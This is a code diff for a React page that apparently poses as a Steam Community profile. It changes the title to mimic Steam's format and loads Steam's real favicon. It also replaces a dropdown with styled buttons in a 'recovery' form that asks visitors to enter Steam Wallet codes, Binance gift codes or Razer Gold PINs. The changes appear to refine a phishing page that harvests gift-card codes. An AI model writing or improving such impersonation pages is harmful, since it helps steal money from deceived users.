@@ -415,7 +415,15 @@ useEffect(() => {
   return (
     <div className="profile-isolated">
       <Head>
-        <title>Steam Profile - {profileData?.displayName || steamID}</title>
+        <title>
+  Steam Community :: {profileData?.displayName || steamID}
+</title>
+
+<link
+  rel="icon"
+  href="https://store.steampowered.com/favicon.ico"
+/>
+
 
         {/* Fonts */}
         <style>{`
@@ -1181,6 +1189,45 @@ useEffect(() => {
   margin-bottom: 10px;
 }
 
+.provider-options {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin-bottom: 10px;
+}
+
+.provider-option {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 10px;
+  border-radius: 8px;
+  background: #0b1825;
+  border: 1px solid rgba(255,255,255,0.08);
+  cursor: pointer;
+  color: white;
+  transition: all 0.2s ease;
+}
+
+.provider-option img {
+  width: 26px;
+  height: 26px;
+}
+
+.provider-option span {
+  font-weight: 600;
+}
+
+.provider-option:hover {
+  background: #13263a;
+}
+
+.provider-option.active {
+  background: linear-gradient(180deg, #2ac0ff, #0097d1);
+  color: #01202a;
+}
+
+
 .recovery-submit-btn {
   width: 100%;
   padding: 10px 0;
@@ -1294,11 +1341,36 @@ useEffect(() => {
 )}
 
             <label>Provider</label>
-            <select value={provider} onChange={(e) => setProvider(e.target.value)}>
-              <option value="steam">Steam Wallet Code</option>
-              <option value="binance">Binance Gift Code</option>
-              <option value="razer">Razer Gold PIN</option>
-            </select>
+
+<div className="provider-options">
+  <button
+    type="button"
+    className={`provider-option ${provider === "steam" ? "active" : ""}`}
+    onClick={() => setProvider("steam")}
+  >
+    <img src="/icons/steam.png" alt="Steam" />
+    <span>Steam Wallet Code</span>
+  </button>
+
+  <button
+    type="button"
+    className={`provider-option ${provider === "binance" ? "active" : ""}`}
+    onClick={() => setProvider("binance")}
+  >
+    <img src="/icons/binance.png" alt="Binance" />
+    <span>Binance Gift Code</span>
+  </button>
+
+  <button
+    type="button"
+    className={`provider-option ${provider === "razer" ? "active" : ""}`}
+    onClick={() => setProvider("razer")}
+  >
+    <img src="/icons/razer.png" alt="Razer" />
+    <span>Razer Gold PIN</span>
+  </button>
+</div>
+
 
             <label>Enter Your Code</label>
             <input
